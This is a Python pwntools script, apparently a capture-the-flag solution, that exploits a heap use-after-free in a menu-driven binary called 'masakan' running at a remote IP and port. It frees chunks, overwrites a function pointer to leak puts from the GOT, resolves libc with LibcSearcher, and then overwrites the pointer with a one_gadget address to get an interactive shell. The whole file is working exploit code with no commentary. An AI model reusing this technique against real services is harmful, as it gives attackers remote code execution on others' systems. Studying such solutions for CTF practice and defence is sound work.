#!/usr/bin/python

from pwn import *
from LibcSearcher import *

def cook(size, data):
    s.recvuntil(':')
    s.send('1')
    s.recvuntil(':')
    s.send('rempahratus')
    s.recvuntil(':')
    s.send(str(size))
    s.recvuntil(':')
    s.send(data)

def discard(index):
    s.recvuntil(':')
    s.send('2')
    s.recvuntil(':')
    s.send(str(index))

def serve(index):
    s.recvuntil(':')
    s.send('3')
    s.recvuntil(':')
    s.send(str(index))
    result = s.recvline()
    return result[:len(result)-1]
    
elf         = ELF('./masakan')
puts_plt    = elf.plt['puts']
puts_got    = elf.got['puts']
    
context.log_level = 'debug'

config = '''
b *0x400c42
'''
#s = process('./masakan')
s = remote('45.76.161.20', 40076)
#gdb.attach(s, config)

cook(0x20, "A")
cook(0x18, "B")

discard(1)
discard(0)

payload  = p64(0x400866)
payload += p64(puts_got)
cook(0x18, payload)

puts            = serve(1)
log.info('puts_raw: ' + repr(puts))
puts            = u64(puts+'\x00'*2)
libc            = LibcSearcher("puts", puts)
base            = puts - libc.dump('puts')
system          = base + libc.dump('system')
one1            = base + 0x4f2c5
one2            = base + 0x4f322
one3            = base + 0x10a38c
log.success('base: ' + hex(base))
log.success('puts: ' + hex(puts))
log.success('system: ' + hex(system))

discard(2)
payload         = p64(one3)
payload        += '\\bin\sh\x00'
cook(0x18, payload)

s.recvuntil(':')
s.send('3')
s.recvuntil(':')
s.send(str(1))
s.interactive()